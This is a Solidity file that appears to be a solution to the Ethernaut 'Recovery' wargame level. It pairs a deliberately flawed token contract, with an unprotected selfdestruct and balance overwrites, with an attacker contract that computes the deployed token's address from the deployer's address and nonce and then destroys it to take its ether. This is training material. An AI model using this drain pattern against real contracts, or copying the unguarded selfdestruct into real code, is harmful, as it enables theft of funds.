// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

contract RecoverFunds {
    Recovery recovery;

    constructor(address _recovery) {
        recovery = Recovery(_recovery);
    }

    // send the wrong 0.001 ether
    function sendEthers(address _addr) public {
        payable(_addr).call{value: 0.001 ether}("");
    }

    function recover(uint256 nonce) public {
        address predictedAddress =
        address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6), // `0xd6` constant for address calculation
                            bytes1(0x94), // `0x94` constant for address calculation
                            address(recovery), // Deployer address (the Recovery contract address)
                            bytes1(uint8(nonce)) // Nonce, here it is `1` for the first deployment
                        )
                    )
                )
            )
        );

        sendEthers(predictedAddress);
        SimpleToken(payable(predictedAddress)).destroy(payable(address(this)));
    }

    function generateToken() public {
        recovery.generateToken("TestToken", 10000);
    }

    receive() external payable {}
}
